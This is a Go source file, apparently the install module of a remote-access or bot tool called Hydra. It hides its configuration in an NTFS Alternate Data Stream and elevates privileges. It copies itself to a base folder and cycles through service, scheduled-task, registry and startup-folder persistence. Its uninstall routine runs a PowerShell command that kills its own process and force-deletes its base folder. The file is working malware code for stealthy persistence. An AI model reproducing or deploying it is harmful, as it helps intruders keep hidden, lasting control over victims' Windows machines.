package install

import (
	"encoding/gob"
	"fmt"
	"log"
	"os"
	"path"
	"time"

	"github.com/Raffy27/Hydra/util"
)

type installInfo struct {
	Loaded bool
	Base   string
	Date   time.Time
	PType  int
}

//Info contains persistent configuration details
var Info installInfo

const (
	cmdUninstall = "kill %d -F;rm '%s' -R -Fo"
)

//IsInstalled checks whether or not a valid Base is already present on the system.
func IsInstalled() bool {
	_, err := os.Stat(os.Args[0] + ":" + util.Ads)
	if os.IsNotExist(err) {
		log.Println("Install info does not exist")
		return false
	}
	return true
}

//WriteInstallInfo dumps the current configuration to an Alternate Data Stream in binary format.
func WriteInstallInfo() error {
	Info.Loaded = true

	var fn string
	if Info.Base != "" {
		fn = path.Join(Info.Base, util.Binary)
	} else {
		fn = os.Args[0]
	}

	f, err := os.Create(fn + ":" + util.Ads)
	if err != nil {
		return err
	}
	defer f.Close()

	enc := gob.NewEncoder(f)
	enc.Encode(Info)

	return nil
}

//ReadInstallInfo attempts to read the stored configuration and initialize Info.
func ReadInstallInfo() error {
	f, err := os.Open(os.Args[0] + ":" + util.Ads)
	if err != nil {
		return err
	}
	defer f.Close()
	enc := gob.NewDecoder(f)
	return enc.Decode(&Info)
}

func persist(ptype int) error {
	switch ptype {
	case 0:
		return TryServiceInstall()
	case 1:
		return TryTaskInstall()
	case 2:
		return TryRegistryInstall()
	case 3:
		return TryFolderInstall()
	}
	return nil
}

//Install attempts to deploy the binary to the system and establish persistence.
//It also assembles the install configuration and saves it.
func Install() {
	Info.Date = time.Now()

	util.ElevateLogic()

	base, err := CreateBase()
	util.Panicln(err, "Base creation failed")
	Info.Base = base
	log.Println("Base set: " + base)

	err = CopyExecutable()
	if err != nil {
		log.Println("Binary relocation failed,", err)
	} else {
		log.Println("Binary relocation successful")
	}

	for i := 0; i < 4; i++ {
		if err := persist(i); err == nil {
			log.Printf("Persistence method #%d worked\n", i)
			Info.PType = i
			break
		} else {
			log.Println(i, err)
		}
	}

	log.Println("Install complete")

	err = WriteInstallInfo()
	util.Panicln(err, "Failed to dump install configuration")

}

//Uninstall attempts to undo all of the changes done to the system by Install.
func Uninstall() [4]string {
	var r [4]string
	for i := range r {
		r[i] = "success"
	}
	if err := UninstallService(); err != nil {
		r[0] = err.Error()
	}
	if err := UninstallTask(); err != nil {
		r[1] = "failed"
	}
	if err := UninstallRegistry(nil); err != nil {
		r[2] = err.Error()
	}
	if err := UninstallFolder(); err != nil {
		r[3] = "failed"
	}

	//Remove self
	go func() {
		time.Sleep(5 * time.Second)
		log.Println("Oh shit")
		cmd := fmt.Sprintf(cmdUninstall, os.Getpid(), Info.Base)
		util.RunPowershell(cmd)
		log.Println("Never runs")
	}()

	return r
}
